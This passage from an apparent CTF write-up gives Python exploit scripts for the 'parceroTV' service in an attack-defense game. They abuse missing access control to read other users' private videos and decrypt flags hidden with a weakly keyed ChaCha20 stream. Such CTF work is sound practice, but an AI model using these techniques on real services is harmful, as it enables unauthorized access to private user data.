</span></span><span class="line"><span class="cl">        <span class="n">username</span><span class="p">,</span> <span class="n">password</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choices</span><span class="p">(</span><span class="n">alph</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="mi">12</span><span class="p">)),</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choices</span><span class="p">(</span><span class="n">alph</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="mi">12</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">update</span><span class="p">({</span><span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;python-httpx/0.23.3&#39;</span><span class="p">,</span> <span class="s1">&#39;Accept-Encoding&#39;</span><span class="p">:</span> <span class="s1">&#39;gzip, deflate&#39;</span><span class="p">,</span> <span class="s1">&#39;Accept&#39;</span><span class="p">:</span> <span class="s1">&#39;*/*&#39;</span><span class="p">,</span> <span class="s1">&#39;Connection&#39;</span><span class="p">:</span> <span class="s1">&#39;keep-alive&#39;</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s1">&#39;/newuser&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="n">password</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s1">&#39;/checkcredentials&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="n">password</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">userid</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="sa">f</span><span class="s1">&#39;/get_user_info_with_name/</span><span class="si">{</span><span class="n">username_f</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">video</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="sa">f</span><span class="s1">&#39;/get_private_videos/</span><span class="si">{</span><span class="n">userid</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">a</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;metadata_</span><span class="si">{</span><span class="n">video</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="si">}</span><span class="s1">_</span><span class="si">{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choices</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="mi">4</span><span class="p">))</span><span class="si">}</span><span class="s1">.mp4&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">m</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="n">video</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">            <span class="n">username_f</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">video</span><span class="p">[</span><span class="s1">&#39;location&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">add_metadata</span><span class="p">(</span><span class="s1">&#39;video.mp4&#39;</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">title</span><span class="o">=</span><span class="n">m</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">artist</span><span class="o">=</span><span class="n">m</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">genre</span><span class="o">=</span><span class="n">m</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s1">&#39;/app/create_video&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="n">video</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;description&#39;</span><span class="p">:</span> <span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">12</span><span class="p">)</span><span class="o">.</span><span class="n">hex</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;is_private&#39;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;location&#39;</span><span class="p">:</span> <span class="n">video</span><span class="p">[</span><span class="s1">&#39;location&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">        <span class="p">},</span> <span class="n">files</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;file&#39;</span><span class="p">:</span> <span class="nb">open</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;thumbnail&#39;</span><span class="p">:</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;thumbnail.png&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">a</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">path</span> <span class="o">=</span> <span class="s1">&#39;/get_video_info/&#39;</span> <span class="o">+</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s1">&#39;/get_my_videos&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="mi">0</span><span class="p">][</span><span class="s1">&#39;path&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">brainfuck</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="n">path</span><span class="p">)</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;description&#39;</span><span class="p">]),</span> <span class="n">flush</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">getid</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="nb">round</span> <span class="ow">in</span> <span class="n">getid</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">attack</span><span class="p">(</span><span class="n">getid</span><span class="p">[</span><span class="nb">round</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">attack</span><span class="p">()</span>
</span></span></code></pre></div><p>And</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">random</span><span class="o">,</span> <span class="nn">string</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pathlib</span> <span class="kn">import</span> <span class="n">Path</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">typing</span> <span class="kn">import</span> <span class="n">List</span><span class="p">,</span> <span class="n">Dict</span><span class="p">,</span> <span class="n">Set</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives.ciphers</span> <span class="kn">import</span> <span class="n">Cipher</span><span class="p">,</span> <span class="n">algorithms</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">cryptography.hazmat.backends</span> <span class="kn">import</span> <span class="n">default_backend</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">PER_LETTER</span> <span class="o">=</span> <span class="mi">4096</span> <span class="o">//</span> <span class="mi">26</span>
</span></span><span class="line"><span class="cl"><span class="n">alph</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_uppercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">brainfuck</span><span class="p">(</span><span class="nb">input</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="o">...</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">output</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">build_spanish_words</span><span class="p">(</span><span class="n">path</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;spanish_words.txt&#34;</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">List</span><span class="p">[</span><span class="nb">bytes</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">    <span class="n">raw</span> <span class="o">=</span> <span class="n">Path</span><span class="p">(</span><span class="n">path</span><span class="p">)</span><span class="o">.</span><span class="n">read_bytes</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">all_words</span> <span class="o">=</span> <span class="p">[</span><span class="n">w</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span> <span class="k">for</span> <span class="n">w</span> <span class="ow">in</span> <span class="n">raw</span><span class="o">.</span><span class="n">splitlines</span><span class="p">()</span> <span class="k">if</span> <span class="n">w</span><span class="o">.</span><span class="n">strip</span><span class="p">()]</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">groups</span><span class="p">:</span> <span class="n">Dict</span><span class="p">[</span><span class="nb">bytes</span><span class="p">,</span> <span class="n">List</span><span class="p">[</span><span class="nb">bytes</span><span class="p">]]</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">w</span> <span class="ow">in</span> <span class="n">all_words</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">first</span> <span class="o">=</span> <span class="n">w</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">&lt;=</span> <span class="n">first</span> <span class="o">&lt;=</span> <span class="sa">b</span><span class="s1">&#39;z&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">groups</span><span class="o">.</span><span class="n">setdefault</span><span class="p">(</span><span class="n">first</span><span class="p">,</span> <span class="p">[])</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">w</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">used</span><span class="p">:</span> <span class="n">Set</span><span class="p">[</span><span class="nb">bytes</span><span class="p">]</span> <span class="o">=</span> <span class="nb">set</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span><span class="p">:</span> <span class="n">List</span><span class="p">[</span><span class="nb">bytes</span><span class="p">]</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">letter_ord</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">),</span> <span class="nb">ord</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;z&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">letter</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">letter_ord</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="n">bucket</span> <span class="o">=</span> <span class="n">groups</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">letter</span><span class="p">,</span> <span class="p">[])</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">w</span> <span class="ow">in</span> <span class="n">bucket</span><span class="p">[:</span><span class="n">PER_LETTER</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">w</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">used</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">used</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">w</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">w</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">w</span> <span class="ow">in</span> <span class="n">all_words</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">4096</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">w</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">used</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">used</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">w</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">w</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4096</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Expected 4096 words, got </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">result</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decrypt_spanish_stream</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="n">cipher_words</span><span class="p">:</span> <span class="n">List</span><span class="p">[</span><span class="nb">bytes</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="n">duration_secs</span><span class="p">:</span> <span class="nb">float</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">words_file</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;spanish_words.txt&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">table</span> <span class="o">=</span> <span class="n">build_spanish_words</span><span class="p">(</span><span class="n">words_file</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">inv_table</span> <span class="o">=</span> <span class="p">{</span><span class="n">w</span><span class="p">:</span> <span class="n">i</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">w</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">table</span><span class="p">)}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">bit_buf</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">bit_count</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">cipher_bytes</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">w</span> <span class="ow">in</span> <span class="n">cipher_words</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">idx</span> <span class="o">=</span> <span class="n">inv_table</span><span class="p">[</span><span class="n">w</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">KeyError</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># This should not happen with the corrected byte handling</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">idx</span> <span class="o">&gt;=</span> <span class="mi">4096</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Word index out of range: </span><span class="si">{</span><span class="n">idx</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">bit_buf</span> <span class="o">=</span> <span class="p">(</span><span class="n">bit_buf</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">|</span> <span class="n">idx</span>
</span></span><span class="line"><span class="cl">        <span class="n">bit_count</span> <span class="o">+=</span> <span class="mi">12</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="n">bit_count</span> <span class="o">&gt;=</span> <span class="mi">8</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">bit_count</span> <span class="o">-=</span> <span class="mi">8</span>
</span></span><span class="line"><span class="cl">            <span class="n">byte</span> <span class="o">=</span> <span class="p">(</span><span class="n">bit_buf</span> <span class="o">&gt;&gt;</span> <span class="n">bit_count</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="cl">            <span class="n">cipher_bytes</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">byte</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">ms</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">round</span><span class="p">(</span><span class="n">duration_secs</span> <span class="o">*</span> <span class="mf">1000.0</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">ms</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">ms</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="n">seed</span> <span class="o">=</span> <span class="n">ms</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&#34;little&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="mi">24</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="n">seed</span>
</span></span><span class="line"><span class="cl">    <span class="n">nonce</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="mi">16</span>
</span></span><span class="line"><span class="cl">    <span class="n">cipher</span> <span class="o">=</span> <span class="n">Cipher</span><span class="p">(</span><span class="n">algorithms</span><span class="o">.</span><span class="n">ChaCha20</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">nonce</span><span class="p">),</span> <span class="n">mode</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">backend</span><span class="o">=</span><span class="n">default_backend</span><span class="p">())</span><span class="o">.</span><span class="n">encryptor</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">keystream</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="nb">len</span><span class="p">(</span><span class="n">cipher_bytes</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">plain_bytes</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">cb</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">cipher_bytes</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">kb</span> <span class="o">=</span> <span class="n">keystream</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">plain_bytes</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">cb</span> <span class="o">^</span> <span class="n">kb</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">plain_bytes</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s2">&#34;ignore&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">session</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">update</span><span class="p">({</span><span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;python-httpx/0.23.3&#39;</span><span class="p">,</span> <span class="s1">&#39;Accept-Encoding&#39;</span><span class="p">:</span> <span class="s1">&#39;gzip, deflate&#39;</span><span class="p">,</span> <span class="s1">&#39;Accept&#39;</span><span class="p">:</span> <span class="s1">&#39;*/*&#39;</span><span class="p">,</span> <span class="s1">&#39;Connection&#39;</span><span class="p">:</span> <span class="s1">&#39;keep-alive&#39;</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">extract_vtt_text</span><span class="p">(</span><span class="n">vtt_content</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">List</span><span class="p">[</span><span class="nb">bytes</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">    <span class="n">lines</span> <span class="o">=</span> <span class="n">vtt_content</span><span class="o">.</span><span class="n">splitlines</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">text_lines</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">lines</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">re</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="sa">br</span><span class="s1">&#39;^\d+$&#39;</span><span class="p">,</span> <span class="n">line</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">re</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="sa">br</span><span class="s1">&#39;^\d</span><span class="si">{2}</span><span class="s1">:\d</span><span class="si">{2}</span><span class="s1">:\d</span><span class="si">{2}</span><span class="s1">\.\d</span><span class="si">{3}</span><span class="s1"> --&gt; \d</span><span class="si">{2}</span><span class="s1">:\d</span><span class="si">{2}</span><span class="s1">:\d</span><span class="si">{2}</span><span class="s1">\.\d</span><span class="si">{3}</span><span class="s1">$&#39;</span><span class="p">,</span> <span class="n">line</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span> <span class="o">==</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">line</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;WEBVTT&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="n">text_lines</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># Join all text lines and then split into words</span>
</span></span><span class="line"><span class="cl">    <span class="n">full_text</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39; &#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">text_lines</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">full_text</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl"><span class="n">TEAM_IP</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">service_name</span> <span class="o">=</span> <span class="s1">&#39;parceroTV&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">attacksjson</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;https://9.enowars.com/scoreboard/attack.json&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;services&#39;</span><span class="p">][</span><span class="n">service_name</span><span class="p">][</span><span class="n">TEAM_IP</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">URL</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;http://</span><span class="si">{</span><span class="n">TEAM_IP</span><span class="si">}</span><span class="s1">:7777&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">rnd</span> <span class="ow">in</span> <span class="n">attacksjson</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">vtt_file</span> <span class="o">=</span> <span class="n">rnd</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="s1">&#39;1&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
